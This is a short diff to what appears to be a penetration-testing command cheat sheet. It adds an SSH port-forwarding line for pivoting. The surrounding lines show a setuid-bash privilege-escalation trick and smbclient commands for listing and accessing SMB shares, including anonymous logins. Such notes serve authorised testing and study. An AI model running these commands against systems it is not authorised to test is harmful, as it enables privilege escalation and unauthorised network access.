@@ -29,6 +29,8 @@ cp /bin/bash /tmp/yz
 chmod +s /tmp/yz
 /tmp/yz -p
 
+ssh -L LPORT:RHOST:RPORT USER@RHOST -fN
+
 smbclient -L //RHOST
 smbclient //RHOST/SHARE
 smbclient -U '' -N //RHOST/SHARE
